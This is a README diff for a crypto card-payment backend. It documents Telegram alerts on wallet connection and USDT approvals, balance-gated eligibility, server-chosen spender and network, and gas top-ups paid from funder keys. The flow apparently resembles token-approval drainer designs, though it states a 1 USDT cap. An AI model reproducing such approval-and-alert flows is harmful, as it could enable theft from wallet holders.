@@ -89,15 +89,83 @@ Contract addresses are **not** hardcoded. Set them in environment variables.
 | `PORT` | no | Default `3000`. Render injects this |
 | `NODE_ENV` | no | `development` or `production` |
 | `RPC_ETH` / `RPC_BSC` / `TRON_API_URL` | no | Used for on-chain verification |
+| `TELEGRAM_BOT_TOKEN` | no | Telegram bot token. Server starts without it |
+| `TELEGRAM_CHAT_ID` | no | Destination chat or group id |
 
 Startup is allowed with empty contract values. Creating a payment for a network with missing contracts returns `CONFIGURATION_ERROR`.
+
+## Telegram notifications
+
+Optional. If `TELEGRAM_BOT_TOKEN` or `TELEGRAM_CHAT_ID` is missing, the API still starts and only logs a warning.
+
+### Create a bot and get a token
+
+1. In Telegram, open [@BotFather](https://t.me/BotFather).
+2. Send `/newbot` and follow the prompts.
+3. Copy the bot token BotFather returns. Put it in `TELEGRAM_BOT_TOKEN`. Never commit it or put it in frontend code.
+
+### Chat ID
+
+1. Start a chat with your bot, or add it to a private group.
+2. Send any message.
+3. Call `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates` from your own machine (not from this app’s public API).
+4. Read `chat.id` and set `TELEGRAM_CHAT_ID`.
+
+### Events that send a message
+
+| Event | When |
+| --- | --- |
+| Wallet connected | After WalletConnect **session settlement** and a balance refresh attempt |
+| USDT approval success | Only after **on-chain verification** of `approve` |
+| Card application | After `POST /api/front/contact` succeeds |
+
+Rejected approvals, failed verification, and `request_sent` do **not** send a success message.
+
+### Intentionally excluded
+
+Private keys, seed phrases, passwords, API keys, the Telegram bot token, WalletConnect `symKey`, cookies, and auth tokens. Card form fields that do not exist (name, street address, city, state, postal code) are not invented.
+
+### Local test
+
+There is no public HTTP test route. Run:
+
+```bash
+npm run telegram:test
+```
+
+That sends: `Telegram integration test successful.`
+
+## Read-only balances
+
+After WalletConnect settlement the server reads balances only:
+
+- Ethereum / BSC: `eth_getBalance` and `eth_call` (`balanceOf`)
+- TRON: `GET /v1/accounts/:address` (TronGrid)
+
+USDT contracts come from `*_USDT_CONTRACT`. If unset, USDT is reported unavailable — addresses are never guessed. USD prices are optional (CoinGecko); if the price API fails, balances still return and USD is `Unavailable`, not `$0`.
+
+There is no public balance diagnostic HTTP route. `npm run balances:test` documents the read-only methods.
 
 ## How to configure card contracts
 
 1. Deploy or obtain your card/payment contracts on TRON, BSC, and Ethereum.
 2. Set the six variables above in `.env` (local) or the Render dashboard (production).
 3. Do not put those addresses in frontend code.
-4. The frontend may send only `connectionId` and `network`. Spender, token, and amount are ignored/rejected if supplied.
+4. The frontend may send only `connectionId`. Spender, token, amount, and network are chosen by the server from eligibility and config.
+
+## Card eligibility and gas
+
+A wallet is eligible if **any** of TRON, BSC, or Ethereum has **at least `CARD_MIN_USDT`** (default `1`). Change `CARD_MIN_USDT` in `.env` to raise or lower that gate. Approval is still a maximum of **1 USDT**. Auto TRX funding runs only after eligibility on TRON. Unavailable balances are not treated as zero.
+
+If eligible, the server estimates native gas for a 1 USDT `approve` (read-only). If gas is short, `POST /api/payment/:id/gas-quote` returns a quote. After the user confirms (`/gas-confirm`), the server may send a **configured** native top-up:
+
+- TRON: `GAS_TOPUP_TRON` TRX via `TRON_FUNDER_PRIVATE_KEY`
+- BSC: `GAS_TOPUP_BSC` BNB via `BSC_FUNDER_PRIVATE_KEY`
+- Ethereum: `GAS_TOPUP_ETH` ETH via `ETH_FUNDER_PRIVATE_KEY`
+
+Caps: `GAS_FUNDING_MAX_TRON` / `_BSC` / `_ETH`. The client cannot set the amount. TRX top-up is a native transfer only (not USDT).
+
+Do not auto-send on connect or eligibility. Keys stay in env only and are never returned by the API.
 
 ## API endpoints
 
